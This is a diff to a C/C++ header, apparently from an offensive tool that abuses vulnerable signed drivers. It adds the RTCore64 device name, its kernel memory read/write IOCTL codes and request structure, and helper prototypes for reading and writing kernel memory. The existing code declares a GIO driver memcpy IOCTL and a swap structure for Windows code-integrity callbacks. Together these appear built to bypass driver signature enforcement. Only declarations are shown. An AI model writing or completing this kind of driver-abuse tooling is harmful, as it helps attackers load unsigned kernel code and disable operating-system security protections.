@@ -28,6 +28,21 @@ static WCHAR DriverServiceName[MAX_PATH], LoaderServiceName[MAX_PATH];
 #define IOCTL_GIO_MEMCPY			CTL_CODE(FILE_DEVICE_GIO, 0xa02, METHOD_BUFFERED, FILE_ANY_ACCESS)
 #define dev_name					L"\\Device\\GIO"
 
+#define RTC64_DEVICE_NAME_W					L"\\Device\\RTCore64"
+#define RTC64_IOCTL_MEMORY_READ				0x80002048
+#define RTC64_IOCTL_MEMORY_WRITE			0x8000204c
+
+typedef struct RTC64_MEMORY_STRUCT {
+	BYTE Unknown0[8];  // offset 0x00
+	DWORD64 Address;   // offset 0x08
+	BYTE Unknown1[4];  // offset 0x10
+	DWORD Offset;      // offset 0x14
+	DWORD Size;        // offset 0x18
+	DWORD Value;       // offset 0x1c
+	BYTE Unknown2[16]; // offset 0x20
+}RTC64_MEMORY_STRUCT, * PRTC64_MEMORY_STRUCT;
+
+
 struct seCiCallbacks_swap {
 	uint64_t ciValidateImageHeaderEntry;
 	uint64_t zwFlushInstructionCache;
@@ -46,7 +61,8 @@ namespace vuln {
 }
 
 namespace modules {
-	PVOID EnumerateKernelModules( const std::wstring& targetModuleName);
+	void* retr_ntos_base();
+	PVOID find_kernel_device( const std::wstring& targetModuleName);
 
 	seCiCallbacks_swap get_CIValidate_ImageHeaderEntry();
 }
@@ -69,6 +85,10 @@ namespace helpers {
 	uint64_t ResolveRipRelative( uint64_t instrAddress, int32_t offsetOffset, int instrSize );
 
 	NTSTATUS read_knrl_mem( HANDLE DeviceHandle, ULONG64 target, DWORD64& outValue );
+
+	BOOL RTCoreReadMemory( HANDLE DeviceHandle, ULONG_PTR Address, DWORD ValueSize, DWORD64& Value );
+
+	BOOL RTCoreRead64( ULONG_PTR Address, PDWORD64 Value );
 
 	NTSTATUS write_krnl_mem( HANDLE DeviceHandle, ULONG64 target, DWORD64 value );
 
